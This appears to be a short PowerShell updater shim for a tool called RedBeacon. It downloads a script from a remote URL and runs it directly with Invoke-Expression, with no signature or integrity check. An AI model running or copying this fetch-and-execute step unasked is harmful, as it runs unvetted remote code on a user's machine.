$ErrorActionPreference = "Stop"
$InstallerUrl = "https://bytestaff.jiomig.com/redbeacon/install.ps1"
Write-Host "Redirecting this legacy RedBeacon updater to the current installer..." -ForegroundColor Cyan
$Installer = Invoke-RestMethod -Uri $InstallerUrl -UseBasicParsing
Invoke-Expression ([string]$Installer)
